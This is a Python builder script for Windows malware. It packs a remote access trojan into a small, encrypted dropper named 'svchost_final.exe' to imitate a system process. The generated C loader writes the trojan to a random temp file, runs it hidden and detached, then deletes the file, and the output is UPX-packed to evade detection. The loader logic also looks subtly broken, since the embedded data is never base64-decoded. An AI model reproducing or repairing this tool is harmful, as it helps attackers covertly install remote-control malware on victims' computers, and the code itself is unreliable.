"""
Compact Loader Builder - Creates single EXE with embedded RAT
"""

import os
import sys
import subprocess
import shutil
import random
import string
import zlib
import base64
from pathlib import Path

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def build_loader(original_exe_path):
    print("=" * 60)
    print("COMPACT LOADER BUILDER")
    print("=" * 60)
    
    if not os.path.exists(original_exe_path):
        print(f"EXE not found: {original_exe_path}")
        return None
    
    output_dir = os.path.dirname(original_exe_path)
    
    print("Reading RAT EXE...")
    with open(original_exe_path, 'rb') as f:
        exe_data = f.read()
    
    print(f"RAT size: {len(exe_data) / (1024*1024):.1f} MB")
    
    print("Compressing...")
    compressed = zlib.compress(exe_data, level=9)
    print(f"Compressed: {len(compressed) / (1024*1024):.1f} MB")
    
    print("Encrypting...")
    key = os.urandom(32)
    encrypted = bytearray()
    for i, byte in enumerate(compressed):
        encrypted.append(byte ^ key[i % len(key)])
    
    data_b64 = base64.b64encode(encrypted).decode('ascii')
    key_b64 = base64.b64encode(key).decode('ascii')
    
    print("Creating loader EXE with embedded RAT...")
    
    loader_code = f'''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:mainCRTStartup")

static const unsigned char rat_data[] = "{data_b64}";
static const unsigned char xor_key[] = "{key_b64}";

void xor_decrypt(unsigned char* data, int len) {{
    for(int i = 0; i < len; i++) {{
        data[i] ^= xor_key[i % 32];
    }}
}}

void run_rat() {{
    char temp_path[MAX_PATH];
    char temp_file[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_path);
    
    const char* chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    char filename[13];
    for(int i = 0; i < 12; i++) {{
        filename[i] = chars[rand() % 36];
    }}
    filename[12] = '\\0';
    sprintf(temp_file, "%s%s.exe", temp_path, filename);
    
    int data_len = strlen(rat_data);
    unsigned char* decrypted = (unsigned char*)malloc(data_len);
    if (!decrypted) return;
    
    memcpy(decrypted, rat_data, data_len);
    xor_decrypt(decrypted, data_len);
    
    HANDLE hFile = CreateFileA(temp_file, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {{
        DWORD written;
        WriteFile(hFile, decrypted, data_len, &written, NULL);
        CloseHandle(hFile);
        
        STARTUPINFOA si = {{sizeof(si)}};
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        
        CreateProcessA(temp_file, NULL, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW | DETACHED_PROCESS,
                       NULL, NULL, &si, &pi);
        
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        
        Sleep(5000);
        DeleteFileA(temp_file);
    }}
    free(decrypted);
}}

int main() {{
    run_rat();
    return 0;
}}
'''
    
    loader_src = os.path.join(output_dir, 'loader.c')
    with open(loader_src, 'w', encoding='utf-8') as f:
        f.write(loader_code)
    
    print("Compiling loader...")
    loader_exe = os.path.join(output_dir, 'svchost_final.exe')
    
    cmd = [
        'gcc',
        loader_src,
        '-o', loader_exe,
        '-O3',
        '-s',
        '-static',
        '-Wl,--subsystem,windows',
        '-mwindows'
    ]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            print(f"Compilation error: {result.stderr}")
            return None
    except Exception as e:
        print(f"Compilation failed: {e}")
        return None
    
    print("Compressing with UPX...")
    try:
        subprocess.run(['upx', '--best', loader_exe], capture_output=True)
    except:
        pass
    
    original_size = os.path.getsize(original_exe_path) / (1024 * 1024)
    final_size = os.path.getsize(loader_exe) / (1024 * 1024)
    
    print("=" * 60)
    print("DONE")
    print(f"Output: {loader_exe}")
    print(f"Original RAT: {original_size:.1f} MB")
    print(f"Final loader: {final_size:.2f} MB")
    print(f"Compression: {final_size/original_size*100:.1f}%")
    print(f"Saved: {original_size - final_size:.1f} MB")
    print("=" * 60)
    
    try:
        os.remove(loader_src)
    except:
        pass
    
    return loader_exe

if __name__ == "__main__":
    exe_path = "dist/rat_temp.exe"
    
    if len(sys.argv) > 1:
        exe_path = sys.argv[1]
    
    if not os.path.exists(exe_path):
        print(f"EXE not found: {exe_path}")
        sys.exit(1)
    
    build_loader(exe_path)
